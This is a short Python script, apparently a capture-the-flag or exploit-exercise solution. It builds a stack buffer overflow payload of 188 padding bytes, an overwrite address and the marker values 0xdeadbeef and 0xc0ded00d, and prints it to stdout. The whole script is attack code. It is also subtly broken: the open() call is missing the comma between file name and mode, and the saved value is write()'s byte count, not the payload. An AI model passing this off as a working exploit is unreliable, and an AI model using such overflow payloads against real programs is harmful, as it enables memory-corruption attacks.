import sys

text = sys.stdout.buffer.write(b'A'*188+b'\xe2\x91\x04\x80' +
                               b'test\xef\xbe\xad\xde\x0d\xd0\xde\xc0')


with open("paylod.txt" "w") as file:
    file.write(text)
